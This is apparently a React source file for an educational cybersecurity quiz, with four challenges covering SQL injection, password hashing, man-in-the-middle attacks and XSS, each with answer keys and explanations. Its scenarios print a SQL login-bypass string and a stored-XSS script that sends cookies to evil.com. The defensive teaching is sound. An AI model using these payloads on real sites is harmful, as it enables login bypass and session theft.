import { useState } from "react";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Shield, Lock, Key, AlertTriangle, ChevronRight, CheckCircle2, XCircle } from "lucide-react";
import { Textarea } from "@/components/ui/textarea";

interface Question {
  question: string;
  options: string[];
  correctIndex: number;
  explanation: string;
}

interface Challenge {
  id: number;
  title: string;
  difficulty: string;
  icon: any;
  description: string;
  scenario: string;
  questions: Question[];
}

const challenges: Challenge[] = [
  {
    id: 1,
    title: "SQL Injection Defense",
    difficulty: "Beginner",
    icon: Lock,
    description: "Learn how attackers exploit vulnerable SQL queries and how to defend against injection attacks.",
    scenario: "You're building a login form. A user enters the following into the username field:\n\n' OR '1'='1' --\n\nThis bypasses authentication because the query becomes:\nSELECT * FROM users WHERE username='' OR '1'='1' --' AND password='...'",
    questions: [
      {
        question: "What is the BEST defense against SQL injection?",
        options: [
          "Escaping special characters manually",
          "Using parameterized queries / prepared statements",
          "Limiting input length to 20 characters",
          "Blocking all special characters from input",
        ],
        correctIndex: 1,
        explanation: "Parameterized queries (prepared statements) separate SQL code from data, making injection impossible. The database treats user input strictly as data, never as executable code. Manual escaping is error-prone, and blocking characters breaks legitimate use cases.",
      },
      {
        question: "Which of these queries is vulnerable to SQL injection?",
        options: [
          "db.query('SELECT * FROM users WHERE id = $1', [userId])",
          "db.query(`SELECT * FROM users WHERE id = ${userId}`)",
          "db.query('SELECT * FROM users WHERE id = ?', [userId])",
          "db.prepare('SELECT * FROM users WHERE id = :id').bind({ id: userId })",
        ],
        correctIndex: 1,
        explanation: "Template literals that interpolate user input directly into SQL strings are vulnerable. The other options all use parameterized queries that keep user data separate from the SQL command.",
      },
      {
        question: "What additional layer of defense should you add alongside parameterized queries?",
        options: [
          "Use the database as root user for simplicity",
          "Apply the principle of least privilege to database accounts",
          "Store SQL queries in environment variables",
          "Disable error messages entirely",
        ],
        correctIndex: 1,
        explanation: "The principle of least privilege ensures that even if an injection succeeds, the attacker's access is limited. The database account your app uses should only have permissions it actually needs (e.g., SELECT/INSERT on specific tables, not DROP TABLE).",
      },
    ],
  },
  {
    id: 2,
    title: "Password Cracking",
    difficulty: "Intermediate",
    icon: Key,
    description: "Understand how passwords are cracked and learn best practices for secure password storage.",
    scenario: "A database breach exposed a table of user passwords. Some were stored as:\n\n• Plain text: 'password123'\n• MD5 hash: '482c811da5d5b4bc6d497ffa98491e38'\n• bcrypt hash: '$2b$12$LJ3m4ys...' \n\nAttackers used rainbow tables to crack the MD5 hashes in seconds.",
    questions: [
      {
        question: "Why is bcrypt preferred over MD5 for password hashing?",
        options: [
          "bcrypt produces shorter hashes",
          "bcrypt is intentionally slow and includes a salt automatically",
          "bcrypt uses symmetric encryption",
          "MD5 is not a real hashing algorithm",
        ],
        correctIndex: 1,
        explanation: "bcrypt is designed to be computationally expensive (slow), which makes brute-force attacks impractical. It also automatically generates and stores a unique salt per password, defeating rainbow table attacks. MD5 is fast (bad for passwords) and unsalted by default.",
      },
      {
        question: "What is a 'salt' in password hashing?",
        options: [
          "A secret key stored in the application code",
          "A random value added to each password before hashing to ensure unique hashes",
          "An encryption method for transmitting passwords",
          "A technique to compress password databases",
        ],
        correctIndex: 1,
        explanation: "A salt is a unique random value appended to each password before hashing. Even if two users have the same password, their hashes will be different. This prevents attackers from using precomputed tables (rainbow tables) to crack passwords in bulk.",
      },
      {
        question: "A user's password is 'Summer2024!'. How would you rate its security?",
        options: [
          "Strong — it has uppercase, lowercase, numbers, and symbols",
          "Moderate — it meets complexity rules but is predictable and short",
          "Weak — it should be at least 30 characters",
          "Strong — special characters make it uncrackable",
        ],
        correctIndex: 1,
        explanation: "Despite meeting typical complexity rules, 'Summer2024!' follows a common pattern (Season + Year + Symbol) that password crackers specifically target. A randomly generated passphrase like 'correct-horse-battery-staple' is both more secure and easier to remember. Length + randomness beats complexity rules.",
      },
    ],
  },
  {
    id: 3,
    title: "Network Security",
    difficulty: "Advanced",
    icon: Shield,
    description: "Master network security concepts including HTTPS, firewalls, and man-in-the-middle attacks.",
    scenario: "You're at a coffee shop using public Wi-Fi. You visit your bank's website. An attacker on the same network performs a Man-in-the-Middle (MITM) attack:\n\n1. They set up a rogue access point 'CoffeeShop_Free'\n2. Your traffic routes through their machine\n3. They can read unencrypted HTTP traffic\n4. HTTPS traffic shows as encrypted gibberish to them",
    questions: [
      {
        question: "What prevents a MITM attacker from reading HTTPS traffic?",
        options: [
          "The website's firewall blocks the attacker",
          "TLS encryption ensures data is encrypted end-to-end between your browser and the server",
          "Your antivirus software detects the attack",
          "The router's built-in security features",
        ],
        correctIndex: 1,
        explanation: "TLS (Transport Layer Security) creates an encrypted tunnel between your browser and the web server. Even if an attacker intercepts the traffic, they see only encrypted data. The TLS handshake also verifies the server's identity through certificates, preventing impersonation.",
      },
      {
        question: "What is HSTS and why is it important?",
        options: [
          "A firewall protocol that blocks malicious traffic",
          "HTTP Strict Transport Security — forces browsers to always use HTTPS, preventing SSL stripping attacks",
          "A type of VPN tunnel for secure browsing",
          "A password encryption standard used by banks",
        ],
        correctIndex: 1,
        explanation: "HSTS tells browsers to ONLY connect via HTTPS. Without it, an attacker could perform an SSL stripping attack — intercepting the initial HTTP request before it redirects to HTTPS, and serving an unencrypted version of the site. HSTS prevents this by remembering that a site should always use HTTPS.",
      },
      {
        question: "Which network security measure would BEST protect a company's internal systems?",
        options: [
          "Using a single strong password for all systems",
          "Zero Trust Architecture — verify every request regardless of network location",
          "Blocking all inbound internet traffic",
          "Using only wired connections",
        ],
        correctIndex: 1,
        explanation: "Zero Trust ('never trust, always verify') treats every request as potentially hostile, regardless of whether it comes from inside or outside the network. It requires authentication, authorization, and encryption for every access attempt. This protects against both external attacks and insider threats.",
      },
    ],
  },
  {
    id: 4,
    title: "XSS Prevention",
    difficulty: "Intermediate",
    icon: AlertTriangle,
    description: "Learn to identify and prevent Cross-Site Scripting (XSS) attacks in web applications.",
    scenario: "A social media app lets users post comments. An attacker posts:\n\n<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>\n\nWhen other users view the comment, the script executes in their browser, stealing their session cookies and sending them to the attacker's server.",
    questions: [
      {
        question: "What is the PRIMARY defense against stored XSS attacks?",
        options: [
          "Validating input length on the server",
          "Output encoding/escaping — converting special characters like < > to HTML entities before rendering",
          "Using CAPTCHA on all forms",
          "Requiring users to be logged in to view content",
        ],
        correctIndex: 1,
        explanation: "Output encoding converts characters like < to &lt; and > to &gt; so the browser renders them as text instead of executing them as HTML/JavaScript. This should happen at render time, not just at input time, because data might enter the system through multiple paths (APIs, database imports, etc.).",
      },
      {
        question: "How does Content Security Policy (CSP) help prevent XSS?",
        options: [
          "It encrypts all JavaScript on the page",
          "It specifies which sources of content (scripts, styles, images) the browser should trust and execute",
          "It blocks all third-party cookies",
          "It validates all form inputs automatically",
        ],
        correctIndex: 1,
        explanation: "CSP is an HTTP header that tells the browser which sources are allowed to load scripts, styles, and other resources. For example, `script-src 'self'` only allows scripts from your own domain, blocking any injected scripts from executing. It's a powerful second line of defense after output encoding.",
      },
      {
        question: "Why is using `dangerouslySetInnerHTML` in React a security risk?",
        options: [
          "It makes the app slower",
          "It bypasses React's automatic XSS protection by inserting raw HTML without escaping",
          "It only works in development mode",
          "It breaks server-side rendering",
        ],
        correctIndex: 1,
        explanation: "React automatically escapes content rendered in JSX, preventing XSS. `dangerouslySetInnerHTML` bypasses this protection and inserts raw HTML directly into the DOM. If the HTML contains user-supplied data that hasn't been sanitized, it creates an XSS vulnerability. If you must use it, sanitize the HTML with a library like DOMPurify first.",
      },
    ],
  },
];

const CybersecurityLab = () => {
  const [activeChallenge, setActiveChallenge] = useState<number | null>(null);
  const [currentQuestion, setCurrentQuestion] = useState(0);
  const [selectedAnswer, setSelectedAnswer] = useState<number | null>(null);
  const [showResult, setShowResult] = useState(false);
  const [score, setScore] = useState(0);
  const [completed, setCompleted] = useState(false);

  const startChallenge = (id: number) => {
    setActiveChallenge(id);
    setCurrentQuestion(0);
    setSelectedAnswer(null);
    setShowResult(false);
    setScore(0);
    setCompleted(false);
  };

  const challenge = challenges.find((c) => c.id === activeChallenge);

  const handleAnswer = (index: number) => {
    if (showResult) return;
    setSelectedAnswer(index);
    setShowResult(true);
    if (challenge && index === challenge.questions[currentQuestion].correctIndex) {
      setScore((s) => s + 1);
    }
  };

  const nextQuestion = () => {
    if (!challenge) return;
    if (currentQuestion + 1 < challenge.questions.length) {
      setCurrentQuestion((q) => q + 1);
      setSelectedAnswer(null);
      setShowResult(false);
    } else {
      setCompleted(true);
    }
  };

  if (activeChallenge && challenge) {
    if (completed) {
      return (
        <div className="h-full flex flex-col p-6 gap-6 overflow-y-auto pb-24">
          <Card className="p-8 text-center space-y-4">
            <div className="w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center mx-auto">
              <Shield className="w-8 h-8 text-primary" />
            </div>
            <h2 className="text-2xl font-bold text-foreground">Challenge Complete!</h2>
            <p className="text-lg text-muted-foreground">
              {challenge.title}
            </p>
            <p className="text-3xl font-bold text-primary">
              {score} / {challenge.questions.length}
            </p>
            <p className="text-sm text-muted-foreground">
              {score === challenge.questions.length
                ? "Perfect score! You have a solid understanding of this topic."
                : score >= challenge.questions.length / 2
                ? "Good effort! Review the explanations to strengthen your knowledge."
                : "Keep studying! Security concepts take practice to master."}
            </p>
            <div className="flex gap-3 justify-center pt-2">
              <Button variant="outline" onClick={() => startChallenge(challenge.id)}>
                Retry Challenge
              </Button>
              <Button onClick={() => setActiveChallenge(null)}>
                Back to Lab
              </Button>
            </div>
          </Card>
        </div>
      );
    }

    const q = challenge.questions[currentQuestion];

    return (
      <div className="h-full flex flex-col p-6 gap-6 overflow-y-auto pb-24">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Button variant="ghost" size="sm" onClick={() => setActiveChallenge(null)}>
              ← Back
            </Button>
            <h2 className="text-xl font-bold text-foreground">{challenge.title}</h2>
          </div>
          <span className="text-sm text-muted-foreground">
            Question {currentQuestion + 1} of {challenge.questions.length}
          </span>
        </div>

        {currentQuestion === 0 && !showResult && (
          <Card className="p-5 bg-muted/50 border-border">
            <p className="text-xs uppercase tracking-wider text-muted-foreground mb-2 font-semibold">Scenario</p>
            <pre className="text-sm text-foreground whitespace-pre-wrap font-mono leading-relaxed">
              {challenge.scenario}
            </pre>
          </Card>
        )}

        <Card className="p-6 space-y-5">
          <h3 className="font-semibold text-foreground text-lg">{q.question}</h3>
          <div className="space-y-3">
            {q.options.map((opt, i) => {
              let className =
                "w-full text-left p-4 rounded-lg border transition-all text-sm leading-relaxed ";
              if (!showResult) {
                className +=
                  selectedAnswer === i
                    ? "border-primary bg-primary/5"
                    : "border-border hover:border-primary/40 hover:bg-muted/50 cursor-pointer";
              } else if (i === q.correctIndex) {
                className += "border-green-500 bg-green-500/10 text-foreground";
              } else if (i === selectedAnswer) {
                className += "border-red-500 bg-red-500/10 text-foreground";
              } else {
                className += "border-border opacity-50";
              }
              return (
                <button key={i} className={className} onClick={() => handleAnswer(i)}>
                  <div className="flex items-start gap-3">
                    <span className="font-semibold text-muted-foreground mt-0.5">
                      {String.fromCharCode(65 + i)}.
                    </span>
                    <span>{opt}</span>
                    {showResult && i === q.correctIndex && (
                      <CheckCircle2 className="w-5 h-5 text-green-500 ml-auto flex-shrink-0 mt-0.5" />
                    )}
                    {showResult && i === selectedAnswer && i !== q.correctIndex && (
                      <XCircle className="w-5 h-5 text-red-500 ml-auto flex-shrink-0 mt-0.5" />
                    )}
                  </div>
                </button>
              );
            })}
          </div>

          {showResult && (
            <div className="border-t border-border pt-4 space-y-3">
              <p className="text-sm font-semibold text-foreground">Explanation:</p>
              <p className="text-sm text-muted-foreground leading-relaxed">{q.explanation}</p>
              <Button onClick={nextQuestion} className="mt-2">
                {currentQuestion + 1 < challenge.questions.length ? "Next Question" : "See Results"}
                <ChevronRight className="w-4 h-4 ml-1" />
              </Button>
            </div>
          )}
        </Card>
      </div>
    );
  }

  return (
    <div className="h-full flex flex-col p-6 gap-6">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-lg bg-primary/10 flex items-center justify-center">
            <Shield className="w-5 h-5 text-primary" />
          </div>
          <h2 className="text-2xl font-bold">Cybersecurity Lab</h2>
        </div>
      </div>

      <div className="flex-1 overflow-auto">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {challenges.map((challenge) => (
            <Card key={challenge.id} className="p-6 hover:shadow-lg transition-shadow">
              <div className="flex items-start gap-4">
                <div className="w-12 h-12 rounded-lg bg-primary/10 flex items-center justify-center flex-shrink-0">
                  <challenge.icon className="w-6 h-6 text-primary" />
                </div>
                <div className="flex-1">
                  <h3 className="font-semibold text-lg mb-1">{challenge.title}</h3>
                  <p className="text-sm text-muted-foreground mb-1">
                    Difficulty: <span className="text-foreground">{challenge.difficulty}</span>
                  </p>
                  <p className="text-xs text-muted-foreground mb-4">{challenge.description}</p>
                  <Button size="sm" onClick={() => startChallenge(challenge.id)}>
                    Start Challenge
                  </Button>
                </div>
              </div>
            </Card>
          ))}
        </div>
      </div>
    </div>
  );
};

export default CybersecurityLab;
